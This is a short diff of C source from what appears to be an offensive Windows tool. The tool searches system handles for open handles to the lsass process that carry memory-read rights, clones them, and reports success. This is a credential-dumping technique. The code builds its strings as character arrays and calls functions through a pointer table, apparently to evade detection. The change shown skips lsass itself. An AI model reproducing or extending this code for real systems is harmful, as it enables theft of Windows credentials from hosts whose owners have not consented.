@@ -87,10 +87,11 @@ HANDLE check_handles(PSYSTEM_HANDLE_INFORMATION handle_info, DWORD in_pid, char*
 
             if (!ptr_functions->_GetProcessImageFileNameA(h_process, process_path, MAX_PATH))
                 continue;
+            process_name = (char*)ptr_functions->_PathFindFileNameA(process_path);
+            if (!ptr_functions->_lstrcmpA(process_name,str_lsass))
+                continue;
 
             if (ptr_functions->_strstrA(handle_name, str_lsass) != NULL && (((PROCESS_QUERY_INFORMATION | PROCESS_VM_READ) & entry_info->GrantedAccess) != 0)) {
-
-                process_name = (char*)ptr_functions->_PathFindFileNameA(process_path);
 
                 char msg_found[] = { '[','+',']',' ','F','o','u','n','d',' ','a','n','d',' ','s','u','c','c','e','s','s','f','u','l','l','y',' ','c','l','o','n','e','d',' ','h','a','n','d','l','e',' ','(','%','d',')',' ','t','o',' ','l','s','a','s','s',' ','i','n',':',' ','%','s',' ','(','%','d',')','\n', 0x00 };
                 char msg_handle_rights[] = { '\t','[','+',']',' ','H','a','n','d','l','e',' ','R','i','g','h','t','s',':',' ','%','x','\n', 0x00 };
